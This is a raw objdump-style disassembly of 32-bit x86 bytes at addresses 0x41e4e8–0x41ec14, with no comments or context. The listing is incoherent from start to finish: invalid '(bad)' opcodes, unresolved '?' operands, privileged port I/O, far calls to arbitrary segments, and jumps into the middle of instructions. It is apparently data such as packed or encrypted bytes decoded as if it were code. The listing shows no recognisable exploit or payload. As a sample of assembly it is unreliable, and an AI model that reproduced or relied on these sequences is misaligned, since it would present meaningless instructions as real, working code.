  41e4e8:	arpl   cx,ax
  41e4ea:	cmp    BYTE PTR [ebx],0xe2
  41e4ed:	cli    
  41e4ee:	xor    ecx,ebx
  41e4f0:	call   0xacd7:0x6aef3479
  41e4f7:	inc    esi
  41e4f8:	aad    0x6
  41e4fa:	mov    ds:0x3e9594c0,eax
  41e4ff:	stc    
  41e500:	test   BYTE PTR [ecx-0x30],al
  41e503:	in     al,0xfd
  41e505:	sub    al,0x85
  41e507:	imul   ebp,DWORD PTR [edi-0x3e],0xffffffa7
  41e50b:	shl    BYTE PTR [ecx],0x6b
  41e50e:	cmp    edx,DWORD PTR [ecx]
  41e510:	jg     0x41e492
  41e512:	jno    0x41e549
  41e514:	mov    esp,0x86d811c3
  41e519:	enter  0xb2be,0xe5
  41e51d:	inc    esp
  41e51e:	adc    al,0x9d
  41e520:	push   eax
  41e521:	or     BYTE PTR [edx-0x67],al
  41e524:	pop    esi
  41e525:	adc    al,0xf6
  41e527:	out    dx,eax
  41e528:	rcr    DWORD PTR [esp+edx*2+0x3f95656f],cl
  41e52f:	nop
  41e530:	ret    
  41e531:	add    BYTE PTR [esp+ebp*4],bl
  41e534:	aas    
  41e535:	push   esp
  41e536:	push   ebp
  41e537:	lods   eax,DWORD PTR ds:[esi]
  41e538:	push   ss
  41e539:	jmp    0x41e5ba
  41e53b:	repz loop 0x41e537
  41e53e:	mov    esp,0xc2e0352f
  41e543:	sbb    BYTE PTR [eax+0x40],al
  41e546:	mov    ?,WORD PTR [ebp+edx*1+0x51a2a509]
  41e54d:	sub    bl,BYTE PTR [ebp+edi*8+0x1bbe929f]
  41e554:	jge    0x41e51c
  41e556:	xchg   esp,eax
  41e557:	rcl    BYTE PTR [eax+0x5f531a1d],0x6c
  41e55e:	sbb    DWORD PTR [esi+ebp*4+0x3a],0x1c
  41e563:	xchg   esi,eax
  41e564:	mov    DWORD PTR [edx+0x63],0xdbab5111
  41e56b:	les    edx,FWORD PTR [edx+0xf]
  41e56e:	jg     0x41e5e4
  41e570:	xchg   ebx,eax
  41e571:	jo     0x41e5b1
  41e573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e574:	inc    ecx
  41e575:	loopne 0x41e5e9
  41e577:	retf   
  41e578:	sbb    al,0x69
  41e57a:	pushf  
  41e57b:	or     cl,BYTE PTR fs:[edi-0x2f9af774]
  41e582:	imul   ecx,DWORD PTR [ebx],0xffffffe0
  41e585:	int3   
  41e586:	cmp    dh,BYTE PTR [ecx]
  41e588:	ds scas eax,DWORD PTR es:[edi]
  41e58a:	and    al,0x8a
  41e58c:	call   0xf784:0xbd9762ef
  41e593:	icebp  
  41e594:	(bad)  
  41e595:	mov    al,0x4a
  41e597:	dec    ecx
  41e598:	loopne 0x41e5fb
  41e59a:	or     ebp,ebp
  41e59c:	out    dx,eax
  41e59d:	mov    eax,0x241ea946
  41e5a2:	dec    eax
  41e5a3:	lds    edx,FWORD PTR [ebx-0x63a82e9c]
  41e5a9:	jno    0x41e590
  41e5ab:	enter  0x945b,0x6a
  41e5af:	dec    esp
  41e5b0:	mov    ebx,0x6e68e1a2
  41e5b5:	xor    eax,0xa7d746a6
  41e5ba:	in     al,dx
  41e5bb:	xor    DWORD PTR [ebp-0x27c551f8],eax
  41e5c1:	mov    bl,BYTE PTR [esi]
  41e5c3:	cmp    edx,ecx
  41e5c5:	push   ebp
  41e5c6:	and    DWORD PTR [ecx+eiz*2-0x75ce7c1d],0xaca77b4d
  41e5d1:	loop   0x41e652
  41e5d3:	shr    ebx,cl
  41e5d5:	mov    ebx,0x48674c4a
  41e5da:	aam    0x5e
  41e5dc:	data16 (bad) 
  41e5de:	mov    eax,0xcc7413d9
  41e5e3:	lods   al,BYTE PTR ds:[esi]
  41e5e4:	inc    eax
  41e5e5:	cli    
  41e5e6:	add    al,0x21
  41e5e8:	outs   dx,DWORD PTR ds:[esi]
  41e5e9:	mov    edi,edi
  41e5eb:	cmc    
  41e5ec:	mov    ebx,0x9756a9e9
  41e5f1:	cld    
  41e5f2:	dec    edi
  41e5f3:	jae    0x41e5ca
  41e5f5:	xor    ebx,DWORD PTR [esi]
  41e5f7:	push   ebx
  41e5f8:	shr    DWORD PTR [ecx+0x27],cl
  41e5fb:	mov    esp,0x916fab5d
  41e600:	adc    eax,0x9378f6a0
  41e605:	xchg   BYTE PTR [eax+0x46],cl
  41e608:	inc    esp
  41e609:	xchg   BYTE PTR [ecx-0x55],ch
  41e60c:	xchg   esi,eax
  41e60d:	sti    
  41e60e:	pop    ds
  41e60f:	sbb    eax,0x5f2ff69f
  41e614:	dec    ebx
  41e615:	fisub  DWORD PTR ss:[esp+ebp*4+0x3ed8e68b]
  41e61d:	lods   eax,DWORD PTR ds:[esi]
  41e61e:	mov    cl,0x73
  41e620:	add    al,0x81
  41e622:	rcl    DWORD PTR [edi*4-0x7d832ff9],1
  41e629:	scas   eax,DWORD PTR es:[edi]
  41e62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e62b:	mov    eax,0x5bba3686
  41e630:	and    eax,DWORD PTR [esi]
  41e632:	ret    
  41e633:	xor    ch,bh
  41e635:	xlat   BYTE PTR ds:[ebx]
  41e636:	jno    0x41e683
  41e638:	or     al,0x37
  41e63a:	ret    
  41e63b:	pop    ss
  41e63c:	in     eax,0x35
  41e63e:	add    dh,ah
  41e640:	pop    eax
  41e641:	inc    esp
  41e642:	adc    eax,0x6aefb030
  41e647:	mov    eax,ds:0xea48760b
  41e64c:	sbb    eax,DWORD PTR [ecx+0x1de0ec42]
  41e652:	dec    esi
  41e653:	xchg   edx,eax
  41e654:	pop    ebp
  41e655:	dec    esp
  41e656:	mov    esp,0x526d563c
  41e65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e65c:	gs pushf 
  41e65e:	pop    ds
  41e65f:	out    0x6a,al
  41e661:	int3   
  41e662:	mov    eax,0x498d18b8
  41e667:	jecxz  0x41e6e1
  41e669:	gs add ebx,ecx
  41e66c:	daa    
  41e66d:	sbb    BYTE PTR [ebx],0x8c
  41e670:	cld    
  41e671:	cmp    DWORD PTR [esp+ecx*8-0x329b814a],esp
  41e678:	and    al,0xab
  41e67a:	popa   
  41e67b:	cmp    DWORD PTR [ebp+0x21335eb],ecx
  41e681:	lods   eax,DWORD PTR ds:[esi]
  41e682:	xchg   ecx,eax
  41e683:	mov    eax,ds:0xe9532f74
  41e688:	in     eax,0xef
  41e68a:	cli    
  41e68b:	and    ah,al
  41e68d:	mov    dl,0xdb
  41e68f:	lea    ebx,[ebx]
  41e691:	sahf   
  41e692:	xchg   ecx,eax
  41e693:	push   ss
  41e694:	nop
  41e695:	xchg   DWORD PTR [eax],ebx
  41e697:	enter  0x7c93,0x2b
  41e69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e69c:	not    ch
  41e69e:	(bad)
  41e6a1:	push   ss
  41e6a2:	in     al,0xfe
  41e6a4:	stos   DWORD PTR es:[edi],eax
  41e6a5:	js     0x41e699
  41e6a7:	and    BYTE PTR [ebp-0x28e9166a],ch
  41e6ad:	dec    ebp
  41e6ae:	mov    ds:0xde717d8a,al
  41e6b3:	aaa    
  41e6b4:	mov    DWORD PTR [ebp*4+0x79f94c8],eax
  41e6bb:	add    eax,ecx
  41e6bd:	dec    eax
  41e6be:	cmp    BYTE PTR [ebx-0xb9ba004],0xe8
  41e6c5:	addr16 push eax
  41e6c7:	mov    edx,0xbfa8fae3
  41e6cc:	adc    eax,0xc19430ad
  41e6d1:	xchg   esp,eax
  41e6d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6d3:	js     0x41e663
  41e6d5:	and    ebx,DWORD PTR ds:0xb0882fb3
  41e6db:	push   esp
  41e6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6dd:	mov    BYTE PTR [ebp-0x30b9e6d6],bh
  41e6e3:	xlat   BYTE PTR ds:[ebx]
  41e6e4:	and    ebp,DWORD PTR [ebx]
  41e6e6:	mov    ecx,0x830fcc6d
  41e6eb:	pop    edx
  41e6ec:	pop    ebp
  41e6ed:	rol    BYTE PTR [eax],cl
  41e6ef:	in     al,0x40
  41e6f1:	cmc    
  41e6f2:	into   
  41e6f3:	mov    edi,0xc8bd67a4
  41e6f8:	cmp    ecx,DWORD PTR [edx+0x2f]
  41e6fb:	inc    ecx
  41e6fc:	nop
  41e6fd:	add    cl,dh
  41e6ff:	repnz fdiv DWORD PTR [edx]
  41e702:	sahf   
  41e703:	jne    0x41e72d
  41e705:	ins    DWORD PTR es:[edi],dx
  41e706:	cwde   
  41e707:	cmp    al,0x8f
  41e709:	imul   edx,DWORD PTR [ecx],0xffffffd6
  41e70c:	push   es
  41e70d:	xchg   ecx,eax
  41e70e:	ret    
  41e70f:	(bad)  
  41e710:	loopne 0x41e762
  41e712:	pushf  
  41e713:	cmp    edi,ecx
  41e715:	int    0xda
  41e717:	xor    al,0x71
  41e719:	int    0xfa
  41e71b:	les    edx,FWORD PTR [edi]
  41e71d:	test   DWORD PTR [ecx],edx
  41e71f:	xchg   esp,ebx
  41e721:	adc    al,BYTE PTR [edx+0x3b]
  41e724:	mov    eax,DWORD PTR ds:0xf988007b
  41e72a:	je     0x41e6e5
  41e72c:	shr    BYTE PTR [esi],cl
  41e72e:	mov    cl,BYTE PTR [eax]
  41e730:	pop    edx
  41e731:	mov    bh,0xc9
  41e733:	push   ebx
  41e734:	and    al,0x7e
  41e736:	inc    edi
  41e737:	nop
  41e738:	sub    DWORD PTR [ecx+0xcd8e4fb],ebp
  41e73e:	sbb    edx,eax
  41e740:	into   
  41e741:	mov    al,ds:0x57730867
  41e746:	xor    al,0x88
  41e748:	div    BYTE PTR [ecx+0x52feb41b]
  41e74e:	mov    esi,0x2ef8d0e6
  41e753:	leave  
  41e754:	lods   eax,DWORD PTR ds:[esi]
  41e755:	pop    edx
  41e756:	mov    al,ds:0xa0ac4abf
  41e75b:	lahf   
  41e75c:	cmp    eax,0x59bc6228
  41e761:	bound  ebx,QWORD PTR [ecx+0x29]
  41e764:	out    dx,al
  41e765:	push   edi
  41e766:	push   ebp
  41e767:	mov    al,ds:0x6071cdca
  41e76c:	sbb    DWORD PTR [eax],eax
  41e76e:	mov    eax,0x2ef351f7
  41e773:	pop    ss
  41e774:	push   es
  41e775:	(bad)  
  41e776:	jne    0x41e77b
  41e778:	pop    edi
  41e779:	add    ebx,ebp
  41e77b:	sbb    bl,BYTE PTR [edi]
  41e77d:	rol    ah,0xaa
  41e780:	sub    cl,al
  41e782:	int3   
  41e783:	test   eax,0xb0f1850b
  41e788:	mov    ah,0xf7
  41e78a:	mov    al,ds:0x3c2dbc5e
  41e78f:	jne    0x41e804
  41e791:	xchg   ebp,eax
  41e792:	mov    DWORD PTR [edi-0x20],edi
  41e795:	jmp    DWORD PTR [ecx]
  41e797:	std    
  41e798:	(bad)
  41e79b:	and    eax,0x378048ec
  41e7a0:	jns    0x41e793
  41e7a2:	mov    ah,0x99
  41e7a4:	loopne 0x41e780
  41e7a6:	mov    bl,0xa5
  41e7a8:	jae    0x41e7f8
  41e7aa:	mov    ecx,0xcc2f93c
  41e7af:	push   0x41
  41e7b1:	sbb    BYTE PTR [ebx],0xf8
  41e7b4:	fadd   st(6),st
  41e7b6:	and    eax,0x8bb16006
  41e7bb:	add    eax,0xcf91ec5
  41e7c0:	mov    esp,0x5120362e
  41e7c5:	sub    eax,0xf0a09a76
  41e7ca:	push   ecx
  41e7cb:	push   es
  41e7cc:	push   eax
  41e7cd:	adc    DWORD PTR [eax],edi
  41e7cf:	xor    edi,DWORD PTR [esi+0x2fe4de7a]
  41e7d5:	rcr    esi,cl
  41e7d7:	stos   DWORD PTR es:[edi],eax
  41e7d8:	xchg   edx,eax
  41e7d9:	in     eax,dx
  41e7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7db:	enter  0xf51,0xb7
  41e7df:	jo     0x41e83b
  41e7e1:	push   ds
  41e7e2:	mov    ss,WORD PTR [esi+edi*8+0x5e]
  41e7e6:	mov    edi,ebx
  41e7e8:	mov    esp,?
  41e7ea:	mov    dl,0x6a
  41e7ec:	cmc    
  41e7ed:	mov    ebx,0x3851c42e
  41e7f2:	dec    ebp
  41e7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7f5:	fsub   DWORD PTR [edi]
  41e7f7:	add    DWORD PTR [edi-0x3b],edx
  41e7fa:	sub    ah,BYTE PTR [ebp-0x16]
  41e7fd:	mov    edx,0x2698d88b
  41e802:	sbb    eax,0x238141e0
  41e807:	mov    bl,0x9c
  41e809:	sahf   
  41e80a:	add    DWORD PTR [ebx-0x3f],ebp
  41e80d:	xor    eax,0x4de6284f
  41e812:	fwait
  41e813:	jo     0x41e862
  41e815:	adc    al,0xf9
  41e817:	scas   al,BYTE PTR es:[edi]
  41e818:	sbb    DWORD PTR [edi+edi*2+0x1faa5427],edi
  41e81f:	dec    esp
  41e820:	ins    BYTE PTR es:[edi],dx
  41e821:	leave  
  41e822:	lods   eax,DWORD PTR ds:[esi]
  41e823:	xchg   ecx,eax
  41e824:	ret    0xcf2c
  41e827:	out    0x7,al
  41e829:	lds    edi,FWORD PTR [ecx-0x49]
  41e82c:	mov    cs,ecx
  41e82e:	adc    DWORD PTR [eax],esp
  41e830:	xor    eax,0x862d9086
  41e835:	ret    
  41e836:	mov    bh,0xc
  41e838:	push   es
  41e839:	xor    al,0x61
  41e83b:	sub    eax,0xcdd6260b
  41e840:	pop    esp
  41e841:	push   ebx
  41e842:	je     0x41e823
  41e844:	add    eax,0x7b5f611f
  41e849:	push   esi
  41e84a:	scas   al,BYTE PTR es:[edi]
  41e84b:	popa   
  41e84c:	mov    edx,0xb70eaf5a
  41e851:	aad    0x6b
  41e853:	lds    ebp,FWORD PTR [esi-0x62]
  41e856:	js     0x41e8bb
  41e858:	xchg   ebp,eax
  41e859:	dec    eax
  41e85a:	fs cs int3 
  41e85d:	and    eax,0xfe993ce0
  41e862:	jecxz  0x41e8b0
  41e864:	xchg   ebp,eax
  41e865:	icebp  
  41e866:	(bad)  
  41e867:	stos   BYTE PTR es:[edi],al
  41e868:	push   eax
  41e869:	imul   ecx,DWORD PTR [ecx-0x78bd881],0x4ccab15
  41e873:	mov    ah,0xfd
  41e875:	push   esp
  41e876:	mov    dl,0x65
  41e878:	and    esi,DWORD PTR [edx]
  41e87a:	daa    
  41e87b:	stc    
  41e87c:	xchg   esi,eax
  41e87d:	sub    DWORD PTR ds:0xbd251590,0xffffffdb
  41e884:	cmp    BYTE PTR [esi-0x4c0f80c6],0x18
  41e88b:	adc    al,0xa7
  41e88d:	rcl    esi,cl
  41e88f:	int    0x28
  41e891:	mov    eax,ds:0x7ec9acdf
  41e896:	cmp    esi,0x1728518f
  41e89c:	jp     0x41e8f2
  41e89e:	xor    BYTE PTR [esi-0x59],al
  41e8a1:	test   ah,al
  41e8a3:	sbb    eax,esi
  41e8a5:	lds    esp,FWORD PTR [ebp-0x7b]
  41e8a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8a9:	enter  0x2400,0x9a
  41e8ad:	jecxz  0x41e8df
  41e8af:	push   cs
  41e8b0:	mov    ebp,DWORD PTR [esi+0x10e89849]
  41e8b6:	(bad)  
  41e8b7:	sbb    DWORD PTR [esi],esp
  41e8b9:	jae    0x41e8f3
  41e8bb:	sti    
  41e8bc:	test   al,0xcb
  41e8be:	sub    al,0xf9
  41e8c0:	leave  
  41e8c1:	fnstenv [ebp+0x16]
  41e8c4:	pop    ebp
  41e8c5:	daa    
  41e8c6:	fwait
  41e8c7:	sar    esp,1
  41e8c9:	jle    0x41e908
  41e8cb:	test   DWORD PTR [ebx],ebp
  41e8cd:	and    al,0x3
  41e8cf:	mov    ds:0x5f3d4b3a,al
  41e8d4:	jg     0x41e86e
  41e8d6:	push   ds
  41e8d7:	sub    cl,bl
  41e8d9:	(bad)  
  41e8da:	(bad)  
  41e8db:	lock repz jb 0x41e91a
  41e8df:	cmp    al,0xee
  41e8e1:	ficom  WORD PTR [ecx]
  41e8e3:	out    dx,eax
  41e8e4:	pop    esp
  41e8e5:	stc    
  41e8e6:	sub    DWORD PTR [edx],eax
  41e8e8:	and    eax,DWORD PTR ss:[edi-0x19]
  41e8ec:	ror    BYTE PTR [edi+esi*4-0x4f],1
  41e8f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8f1:	mov    ah,0x2f
  41e8f3:	aad    0x2d
  41e8f5:	jb     0x41e8ed
  41e8f7:	push   esp
  41e8f8:	xchg   ebp,eax
  41e8f9:	ret    
  41e8fa:	pop    ds
  41e8fb:	mov    BYTE PTR [eax],cl
  41e8fd:	shl    DWORD PTR [esi-0x43],0xe6
  41e901:	xchg   BYTE PTR [esp+edx*8-0x3aafe99d],bh
  41e908:	test   al,bl
  41e90a:	dec    ebx
  41e90b:	int3   
  41e90c:	(bad)  cs:[eax+0x5683bc94]
  41e913:	out    0xe6,eax
  41e915:	pop    eax
  41e916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e917:	push   cs
  41e918:	mov    bh,0x61
  41e91a:	in     al,0xde
  41e91c:	xchg   ebx,eax
  41e91d:	mov    eax,ds:0xe315c882
  41e922:	idiv   BYTE PTR [esi+0x7]
  41e925:	(bad)  
  41e926:	mov    esi,0x373bd299
  41e92b:	arpl   bx,ax
  41e92d:	arpl   WORD PTR [eax],si
  41e92f:	pop    ss
  41e930:	test   DWORD PTR [esp+edx*1],edi
  41e933:	mov    al,ds:0x5bf9640f
  41e938:	loope  0x41e969
  41e93a:	lock xchg ebx,eax
  41e93c:	ja     0x41e8dc
  41e93e:	dec    ebp
  41e93f:	call   0x6a3:0xf8e1ed1b
  41e946:	push   ss
  41e947:	jg     0x41e9b4
  41e949:	mov    cl,0xa7
  41e94b:	jb     0x41e9b0
  41e94d:	push   es
  41e94e:	retf   
  41e94f:	nop
  41e950:	fisttp QWORD PTR [ecx]
  41e952:	and    eax,0x51997684
  41e957:	in     eax,0x69
  41e959:	mov    bl,BYTE PTR [edx+ecx*1-0x1d]
  41e95d:	out    0xf2,eax
  41e95f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e960:	push   es
  41e961:	pop    edx
  41e962:	jnp    0x41e920
  41e964:	sahf   
  41e965:	cdq    
  41e966:	shl    DWORD PTR [eax+eiz*8-0x6607061a],0xf4
  41e96e:	jnp    0x41e9c3
  41e970:	dec    edx
  41e971:	mov    BYTE PTR [edx+esi*2-0x21],ah
  41e975:	ret    
  41e976:	fdiv   QWORD PTR [ecx+0x4a]
  41e979:	xchg   BYTE PTR [edi+ebx*1],al
  41e97c:	fistp  QWORD PTR [edx+0x7d]
  41e97f:	mov    ?,ecx
  41e981:	fs push edi
  41e983:	and    al,0x37
  41e985:	and    BYTE PTR [edx+0x30],ah
  41e988:	and    BYTE PTR [ebp-0x61],bh
  41e98b:	sub    BYTE PTR [edx-0x42],dl
  41e98e:	jg     0x41e96f
  41e990:	ret    
  41e991:	push   eax
  41e992:	shr    DWORD PTR [edx+0x20],cl
  41e995:	sbb    DWORD PTR [ebx+0x63],ecx
  41e998:	add    al,0xc8
  41e99a:	cmc    
  41e99b:	pop    esi
  41e99c:	aas    
  41e99d:	cwde   
  41e99e:	mov    ebp,0xa4f6c4cb
  41e9a3:	inc    edx
  41e9a4:	sbb    ecx,DWORD PTR [esi+0x13]
  41e9a7:	pop    ss
  41e9a8:	xor    al,0x72
  41e9aa:	stos   DWORD PTR es:[edi],eax
  41e9ab:	das    
  41e9ac:	xchg   ecx,eax
  41e9ad:	push   ebx
  41e9ae:	bnd jne 0x41e9a6
  41e9b1:	sar    DWORD PTR [ebx+ebx*8],cl
  41e9b4:	pop    ebx
  41e9b5:	adc    eax,0xf985cc25
  41e9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9bb:	cdq    
  41e9bc:	fs inc esp
  41e9be:	push   ecx
  41e9bf:	stos   BYTE PTR es:[edi],al
  41e9c0:	(bad)  
  41e9c1:	loope  0x41ea29
  41e9c3:	ss out dx,eax
  41e9c5:	retf   
  41e9c6:	cwde   
  41e9c7:	mov    ecx,0x33ed5bfc
  41e9cc:	xchg   ebx,eax
  41e9cd:	push   esi
  41e9ce:	mov    al,ch
  41e9d0:	xor    dh,dl
  41e9d2:	arpl   WORD PTR ds:0xa8f56d29,sp
  41e9d8:	addr16 push eax
  41e9da:	jp     0x41e97c
  41e9dc:	adc    eax,0x2b7ec77d
  41e9e1:	mov    ecx,0xec514fe0
  41e9e6:	dec    eax
  41e9e7:	mov    ebp,0x67314af9
  41e9ec:	xor    ah,BYTE PTR [ebp+0x6194c5f2]
  41e9f2:	es jne 0x41e978
  41e9f5:	mov    al,ds:0x57eb1320
  41e9fa:	ins    DWORD PTR es:[edi],dx
  41e9fb:	mov    ch,0xcd
  41e9fd:	inc    ebp
  41e9fe:	outs   dx,DWORD PTR ds:[esi]
  41e9ff:	or     ebp,DWORD PTR [eax+ecx*8+0x32]
  41ea03:	xor    BYTE PTR [ecx],0xce
  41ea06:	pop    eax
  41ea07:	daa    
  41ea08:	sub    BYTE PTR [eax+edx*8+0xb414dc],bh
  41ea0f:	dec    ebp
  41ea10:	xchg   edx,eax
  41ea11:	les    ebx,FWORD PTR [ecx]
  41ea13:	sub    DWORD PTR [ebx],ebx
  41ea15:	dec    ebx
  41ea16:	lds    eax,FWORD PTR [esi-0x58]
  41ea19:	in     eax,dx
  41ea1a:	xor    ebp,esi
  41ea1c:	ss clc 
  41ea1e:	(bad)  
  41ea20:	adc    eax,0xd449073a
  41ea25:	jb     0x41ea3f
  41ea27:	test   DWORD PTR cs:[esp+ebx*1+0x2a],ebp
  41ea2c:	jnp    0x41ea0d
  41ea2e:	pop    esi
  41ea2f:	sub    eax,0x982855da
  41ea34:	or     cl,BYTE PTR [eax+ecx*2+0x2bf61b31]
  41ea3b:	pop    ecx
  41ea3c:	jecxz  0x41eaac
  41ea3e:	jmp    0x3ab6:0x49c87556
  41ea45:	aad    0x29
  41ea47:	mov    ah,BYTE PTR [ecx-0x72]
  41ea4a:	add    DWORD PTR [ecx],ebx
  41ea4c:	jnp    0x41ea42
  41ea4e:	mov    dh,0x4e
  41ea50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea51:	das    
  41ea52:	enter  0x5456,0xd2
  41ea56:	pop    ecx
  41ea57:	fist   WORD PTR [ecx-0x24]
  41ea5a:	stos   DWORD PTR es:[edi],eax
  41ea5b:	push   esi
  41ea5c:	scas   eax,DWORD PTR es:[edi]
  41ea5d:	pop    es
  41ea5e:	mov    eax,ds:0x5ecbb5b3
  41ea63:	aas    
  41ea64:	rol    ah,0x83
  41ea67:	pop    ss
  41ea68:	(bad)  
  41ea69:	retf   
  41ea6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea6b:	adc    DWORD PTR [edi-0x20],edx
  41ea6e:	mov    ecx,0xc1c310bd
  41ea73:	daa    
  41ea74:	jne    0x41eaee
  41ea76:	loopne 0x41eab0
  41ea78:	xor    ecx,ebx
  41ea7a:	les    ecx,FWORD PTR [eax]
  41ea7c:	rcl    ebx,0x24
  41ea7f:	(bad)
  41ea83:	ss inc esi
  41ea85:	bound  ebp,QWORD PTR [ebx]
  41ea87:	imul   esp,DWORD PTR [edx],0xffffffe8
  41ea8a:	jge    0x41eadb
  41ea8c:	push   esi
  41ea8d:	xor    ch,ch
  41ea8f:	popf   
  41ea90:	int3   
  41ea91:	fwait
  41ea92:	int3   
  41ea93:	in     eax,dx
  41ea94:	jmp    0x41ead0
  41ea96:	das    
  41ea97:	outs   dx,BYTE PTR ds:[esi]
  41ea98:	inc    edx
  41ea99:	inc    esp
  41ea9a:	int3   
  41ea9b:	cdq    
  41ea9c:	daa    
  41ea9d:	sar    DWORD PTR [ebx-0x275e610],0xa7
  41eaa4:	mov    edi,0x5b3f657c
  41eaa9:	(bad)  
  41eaaa:	shr    BYTE PTR [ebp-0x66e6f969],1
  41eab0:	inc    esp
  41eab1:	xor    eax,0xddab1514
  41eab6:	retf   
  41eab7:	lds    edi,FWORD PTR [ecx+0x327a0110]
  41eabd:	scas   eax,DWORD PTR es:[edi]
  41eabe:	cld    
  41eabf:	leave  
  41eac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eac1:	pop    edx
  41eac2:	mov    eax,DWORD PTR [eax]
  41eac4:	inc    eax
  41eac5:	and    BYTE PTR [ecx],0x59
  41eac8:	jge    0x41ea92
  41eaca:	sub    ebp,DWORD PTR [edx]
  41eacc:	inc    eax
  41eacd:	leave  
  41eace:	out    dx,al
  41eacf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ead0:	das    
  41ead1:	add    dl,BYTE PTR [ecx+0x539ea6dd]
  41ead7:	test   DWORD PTR [ecx-0x10a80632],esp
  41eadd:	mov    bh,0x7d
  41eadf:	ins    DWORD PTR es:[edi],dx
  41eae0:	imul   esp,edx,0x2f
  41eae3:	push   esi
  41eae4:	xchg   edx,eax
  41eae5:	push   esi
  41eae6:	cmc    
  41eae7:	bound  esp,QWORD PTR [edi-0x2bd4afb4]
  41eaed:	daa    
  41eaee:	aas    
  41eaef:	add    DWORD PTR [ebx-0x4ed82915],0xb1ae7025
  41eaf9:	int    0xa8
  41eafb:	jecxz  0x41eb16
  41eafd:	sbb    DWORD PTR [edx],esi
  41eaff:	jl     0x41eb22
  41eb01:	scas   al,BYTE PTR es:[edi]
  41eb02:	xor    DWORD PTR [esi+0x4d],0x31
  41eb06:	ret    
  41eb07:	cmp    eax,DWORD PTR [ebp+0x4ed99fa5]
  41eb0d:	sub    eax,0x29caf313
  41eb12:	push   esp
  41eb13:	fimul  WORD PTR [ecx+0x2a]
  41eb16:	pop    ebp
  41eb17:	ret    0xd80e
  41eb1a:	cmc    
  41eb1b:	fisub  DWORD PTR [edx+ebp*1]
  41eb1e:	jno    0x41eae3
  41eb20:	arpl   dx,ax
  41eb22:	scas   al,BYTE PTR es:[edi]
  41eb23:	push   0xa0686a80
  41eb28:	jl     0x41eb77
  41eb2a:	push   ds
  41eb2b:	test   al,0xf8
  41eb2d:	sub    eax,0xbe503f49
  41eb32:	add    al,0x14
  41eb34:	mov    ah,0xbd
  41eb36:	dec    eax
  41eb37:	mov    ecx,0x35b043c9
  41eb3c:	out    0x4a,al
  41eb3e:	xchg   esi,eax
  41eb3f:	mov    ecx,0x7988c38d
  41eb44:	cld    
  41eb45:	fs pop ss
  41eb47:	push   esi
  41eb48:	cmc    
  41eb49:	mov    ds:0xef2697cd,al
  41eb4e:	and    ecx,DWORD PTR gs:[edi+ebp*8]
  41eb52:	int    0x53
  41eb54:	pop    ebx
  41eb55:	adc    BYTE PTR [esi-0xefeb3bc],dh
  41eb5b:	shl    DWORD PTR [ebx-0x34],1
  41eb5e:	pop    edi
  41eb5f:	pop    edx
  41eb60:	test   eax,0x6036acce
  41eb65:	xor    DWORD PTR [edx-0xd534ca0],ebp
  41eb6b:	ins    BYTE PTR es:[edi],dx
  41eb6c:	add    DWORD PTR [ebx-0x32676d60],edi
  41eb72:	dec    ebx
  41eb73:	dec    ebp
  41eb74:	sahf   
  41eb75:	jg     0x41eb17
  41eb77:	add    ebp,eax
  41eb79:	mov    edx,DWORD PTR [ebx]
  41eb7b:	push   ss
  41eb7c:	sbb    DWORD PTR ds:0xa62c4d66,0x9
  41eb83:	mov    esi,0xcd41e74b
  41eb88:	fwait
  41eb89:	dec    ebx
  41eb8a:	out    dx,eax
  41eb8b:	hlt    
  41eb8c:	imul   eax,DWORD PTR [edx+0x494ec2b6],0x53a69032
  41eb96:	pop    ecx
  41eb97:	push   es
  41eb98:	mov    WORD PTR [edi],gs
  41eb9a:	lea    edx,[ecx-0x46a23177]
  41eba0:	bound  edi,QWORD PTR [ecx+0x2f7a5679]
  41eba6:	sbb    BYTE PTR [ebp+0x4464c4a0],bl
  41ebac:	push   cs
  41ebad:	sub    esi,edi
  41ebaf:	icebp  
  41ebb0:	pop    DWORD PTR [edx+0x68]
  41ebb3:	mov    edx,0xd086a446
  41ebb8:	pop    ss
  41ebb9:	in     al,0x8
  41ebbb:	vsubsd xmm7,xmm7,xmm1
  41ebbf:	mov    bh,0xb0
  41ebc1:	mov    DWORD PTR [edx],esp
  41ebc3:	enter  0x9c95,0x4c
  41ebc7:	or     esi,DWORD PTR [ecx+0x7]
  41ebca:	cwde   
  41ebcb:	int    0x51
  41ebcd:	aad    0x15
  41ebcf:	mov    dh,BYTE PTR [edi+esi*2-0x79]
  41ebd3:	push   ds
  41ebd4:	out    dx,eax
  41ebd5:	pop    ds
  41ebd6:	out    0x8d,eax
  41ebd8:	xor    esi,DWORD PTR [edi+0x580623ef]
  41ebde:	jo     0x41ebb8
  41ebe0:	fnstsw WORD PTR [eax+0x46c51ee9]
  41ebe6:	cli    
  41ebe7:	not    eax
  41ebe9:	int3   
  41ebea:	outs   dx,DWORD PTR ds:[esi]
  41ebeb:	push   esp
  41ebec:	jge    0x41eb80
  41ebee:	ffree  st(2)
  41ebf0:	in     eax,0x1a
  41ebf2:	and    bh,BYTE PTR [eax+ebp*2]
  41ebf5:	sub    eax,0x69e57dfd
  41ebfa:	shr    esi,cl
  41ebfc:	(bad)  
  41ebfd:	mov    bh,0x68
  41ebff:	ss jge 0x41eb98
  41ec02:	dec    ebp
  41ec03:	jnp    0x41ec2d
  41ec05:	cmp    eax,0x67816332
  41ec0a:	call   0x33d1:0x7b29b275
  41ec11:	daa    
  41ec12:	fcmovu st,st(7)
  41ec14:	daa    
